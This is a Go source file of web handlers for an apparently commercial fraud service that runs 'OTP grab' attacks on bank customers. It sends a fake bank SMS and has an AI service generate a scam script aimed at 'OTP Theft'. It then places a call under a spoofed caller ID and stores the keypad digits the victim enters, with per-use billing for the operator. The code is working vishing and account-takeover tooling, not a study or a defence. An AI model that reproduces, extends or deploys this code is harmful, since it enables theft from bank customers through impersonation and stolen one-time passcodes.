package handlers

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/google/uuid"
	"github.com/jackc/pgx/v5"
	"github.com/jackc/pgx/v5/pgxpool"
	"github.com/redis/go-redis/v9"

	"hushcircuits/api/internal/database"
	"hushcircuits/api/internal/models"
	"hushcircuits/api/internal/phone"
	"hushcircuits/api/internal/services"
)

type OTPGrabState struct {
	ID            string     `json:"id"`
	Status        string     `json:"status"`
	Error         string     `json:"error,omitempty"`
	SMSSent       bool       `json:"sms_sent"`
	CallID        string     `json:"call_id,omitempty"`
	CallStatus    string     `json:"call_status,omitempty"`
	DTMFCaptured  string     `json:"dtmf_captured,omitempty"`
	PhoneNumber   string     `json:"phone_number"`
	BankName      string     `json:"bank_name"`
	TargetName    string     `json:"target_name"`
	TargetService string     `json:"target_service"`
	CreatedAt     time.Time  `json:"created_at"`
	UpdatedAt     time.Time  `json:"updated_at"`
	done          chan struct{}
}

type OTPHandler struct {
	q             *database.Queries
	pool          *pgxpool.Pool
	rdb           *redis.Client
	fsSvc         *services.FreeSwitchService
	smsSvc        *services.GENSMSService
	featherlessSvc *services.FeatherlessService
	tokens        *services.TokenService
	otpGrabCostUSD    float64
	otpGrabTokens     int
	otpGrabCallCostUSD float64
	otpGrabCallTokens  int
}

func NewOTPHandler(pool *pgxpool.Pool, rdb *redis.Client, fsSvc *services.FreeSwitchService, smsSvc *services.GENSMSService, featherlessSvc *services.FeatherlessService, tokens *services.TokenService, otpGrabCostUSD float64, otpGrabTokens int, otpGrabCallCostUSD float64, otpGrabCallTokens int) *OTPHandler {
	return &OTPHandler{
		q:              database.NewQueries(pool),
		pool:           pool,
		rdb:            rdb,
		fsSvc:          fsSvc,
		smsSvc:         smsSvc,
		featherlessSvc: featherlessSvc,
		tokens:         tokens,
		otpGrabCostUSD:    otpGrabCostUSD,
		otpGrabTokens:     otpGrabTokens,
		otpGrabCallCostUSD: otpGrabCallCostUSD,
		otpGrabCallTokens:  otpGrabCallTokens,
	}
}

func (h *OTPHandler) LaunchGrab(c *fiber.Ctx) error {
	uid, ok := userID(c)
	if !ok {
		return c.Status(401).JSON(fiber.Map{"error": "unauthorized"})
	}
	var req struct {
		PhoneNumber    string `json:"phone_number"`
		SenderID       string `json:"sender_id"`
		SpoofedCID     string `json:"spoofed_caller_id"`
		SpoofedName    string `json:"spoofed_name"`
		BankName       string `json:"bank_name"`
		TargetName     string `json:"target_name"`
		TargetAge      int    `json:"target_age"`
		TargetDetails  string `json:"target_details"`
	}
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request"})
	}
	if req.PhoneNumber == "" || req.SpoofedCID == "" || req.BankName == "" {
		return c.Status(400).JSON(fiber.Map{"error": "phone_number, spoofed_caller_id, and bank_name required"})
	}
	if !phone.Validate(req.PhoneNumber) || !phone.Validate(req.SpoofedCID) {
		return c.Status(400).JSON(fiber.Map{"error": "numbers must be 1+10 digit format: 1XXXXXXXXXX"})
	}
	req.PhoneNumber = phone.Normalize(req.PhoneNumber)
	req.SpoofedCID = phone.Normalize(req.SpoofedCID)

	if req.SenderID == "" {
		req.SenderID = req.BankName
	}
	if req.SpoofedName == "" {
		req.SpoofedName = req.BankName
	}

	balance, isVIP, _, _ := h.q.GetProfile(c.Context(), uid)
	if !isVIP && balance < 1.0 {
		return c.Status(402).JSON(fiber.Map{"error": "insufficient balance", "required": 1.0})
	}

	grabID := uuid.New().String()
	state := &OTPGrabState{
		ID:            grabID,
		Status:        "pending",
		PhoneNumber:   req.PhoneNumber,
		BankName:      req.BankName,
		TargetName:    req.TargetName,
		CreatedAt:     time.Now(),
		UpdatedAt:     time.Now(),
	}

	if err := h.saveState(state); err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to initialize grab state"})
	}

	if !isVIP {
		h.q.ExecTx(c.Context(), func(tx pgx.Tx) error {
			if err := h.q.DeductBalanceTx(tx, c.Context(), uid, h.otpGrabCostUSD); err != nil {
				return err
			}
			return h.q.InsertTransactionTx(tx, c.Context(), uuid.New().String(), uid, "otp_grab", -h.otpGrabCostUSD, h.otpGrabTokens, "OTP Grab: "+req.BankName, "completed")
		})
	}

	go h.runGrabFlow(c.Context(), grabID, uid, &req)

	return c.JSON(fiber.Map{
		"id":     grabID,
		"status": "pending",
		"message": fmt.Sprintf("OTP grab launched against %s via %s", req.PhoneNumber, req.BankName),
	})
}

func (h *OTPHandler) GetGrabStatus(c *fiber.Ctx) error {
	grabID := c.Params("id")

	state, err := h.getState(grabID)
	if err != nil {
		return c.Status(404).JSON(fiber.Map{"error": "grab not found"})
	}

	return c.JSON(fiber.Map{
		"id":             state.ID,
		"status":         state.Status,
		"error":          state.Error,
		"sms_sent":       state.SMSSent,
		"call_id":        state.CallID,
		"call_status":    state.CallStatus,
		"dtmf_captured":  state.DTMFCaptured,
		"phone_number":   state.PhoneNumber,
		"bank_name":      state.BankName,
		"target_name":    state.TargetName,
		"created_at":     state.CreatedAt,
		"updated_at":     state.UpdatedAt,
	})
}

func (h *OTPHandler) ListGrabs(c *fiber.Ctx) error {
	uid, ok := userID(c)
	if !ok {
		return c.Status(401).JSON(fiber.Map{"error": "unauthorized"})
	}
	rows, err := h.q.Pool.Query(c.Context(),
		`SELECT id, status, phone_number, bank_name, target_name, dtmf_captured, created_at
		 FROM otp_grabs WHERE user_id = $1 ORDER BY created_at DESC LIMIT 20`, uid)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "query failed"})
	}
	defer rows.Close()

	var grabs []fiber.Map
	for rows.Next() {
		var id, status, phone, bank, target, dtmf string
		var ca interface{}
		rows.Scan(&id, &status, &phone, &bank, &target, &dtmf, &ca)
		grabs = append(grabs, fiber.Map{
			"id": id, "status": status, "phone_number": phone,
			"bank_name": bank, "target_name": target,
			"dtmf_captured": dtmf, "created_at": ca,
		})
	}
	if grabs == nil {
		grabs = []fiber.Map{}
	}
	return c.JSON(fiber.Map{"grabs": grabs})
}

func (h *OTPHandler) runGrabFlow(ctx context.Context, grabID, userID string, req *struct {
	PhoneNumber   string `json:"phone_number"`
	SenderID      string `json:"sender_id"`
	SpoofedCID    string `json:"spoofed_caller_id"`
	SpoofedName   string `json:"spoofed_name"`
	BankName      string `json:"bank_name"`
	TargetName    string `json:"target_name"`
	TargetAge     int    `json:"target_age"`
	TargetDetails string `json:"target_details"`
}) {
	state, err := h.getState(grabID)
	if err != nil {
		return
	}

	// Step 1: Send SMS
	otpCode := fmt.Sprintf("%06d", time.Now().UnixNano()%1000000)
	smsContent := fmt.Sprintf(`%s ALERT: Your verification code is %s. If you did not request this, call %s immediately.`, req.BankName, otpCode, req.SpoofedCID)
	_, err = h.smsSvc.Send(req.PhoneNumber, smsContent, req.SenderID)
	if err != nil {
		h.updateState(grabID, "failed", fmt.Sprintf("SMS failed: %v", err))
		return
	}

	h.updateState(grabID, "sms_sent", "")
	state, _ = h.getState(grabID)
	state.SMSSent = true
	h.saveState(state)

	// Step 2: Wait 25 seconds for victim to see SMS
	select {
	case <-ctx.Done():
		h.updateState(grabID, "cancelled", "context cancelled")
		return
	case <-time.After(25 * time.Second):
	}

	// Step 3: Generate script
	h.updateState(grabID, "generating_script", "")
	scriptReq := &models.GenerateScriptRequest{
		TargetName:    req.TargetName,
		TargetAge:     req.TargetAge,
		TargetService: req.BankName,
		TargetDetails: req.TargetDetails,
		Goal:          "OTP Theft",
		ScriptType:    "custom",
	}
	_, err = h.featherlessSvc.GenerateScript(scriptReq)
	if err != nil {
		// fallback script generated in service layer
	}

	// Step 4: Initiate call with spoofed caller ID
	h.updateState(grabID, "call_initiated", "")
	callID, err := h.fsSvc.OriginateCall(&models.OriginateCallRequest{
		SpoofedCallerID:   req.SpoofedCID,
		SpoofedName:       req.SpoofedName,
		DestinationNumber: req.PhoneNumber,
	})
	if err != nil {
		h.updateState(grabID, "failed", fmt.Sprintf("Call failed: %v", err))
		return
	}

	state, _ = h.getState(grabID)
	state.CallID = callID
	state.CallStatus = "initiated"
	h.saveState(state)

	// Store the call in DB
	h.q.InsertCall(context.Background(), callID, userID, req.SpoofedCID, req.SpoofedName, req.PhoneNumber, "otp_grab", h.otpGrabCallTokens, h.otpGrabCallCostUSD)

	h.updateState(grabID, "call_active", "")

	// Step 5: Wait for call to complete (simulate with 60s timeout)
	select {
	case <-ctx.Done():
		h.updateState(grabID, "cancelled", "context cancelled")
		return
	case <-time.After(60 * time.Second):
	}

	// Check for captured DTMF
	state, err = h.getState(grabID)
	if err == nil {
		dtmfRows, err := h.q.GetDTMFByCall(context.Background(), callID)
		dtmfStr := ""
		if err == nil {
			for _, d := range dtmfRows {
				dtmfStr += d.Digit
			}
		}
		state.DTMFCaptured = dtmfStr
		state.CallStatus = "completed"
		h.saveState(state)
	}

	h.updateState(grabID, "completed", "")
}

func (h *OTPHandler) getState(id string) (*OTPGrabState, error) {
	ctx := context.Background()
	val, err := h.rdb.Get(ctx, "otp_grab:"+id).Result()
	if err != nil {
		return nil, err
	}

	var state OTPGrabState
	if err := json.Unmarshal([]byte(val), &state); err != nil {
		return nil, err
	}
	return &state, nil
}

func (h *OTPHandler) saveState(state *OTPGrabState) error {
	ctx := context.Background()
	data, err := json.Marshal(state)
	if err != nil {
		return err
	}
	// TTL of 24 hours
	return h.rdb.Set(ctx, "otp_grab:"+state.ID, data, 24*time.Hour).Err()
}

func (h *OTPHandler) updateState(id, status, errMsg string) {
	state, err := h.getState(id)
	if err != nil {
		return
	}
	state.Status = status
	state.Error = errMsg
	state.UpdatedAt = time.Now()
	h.saveState(state)
}
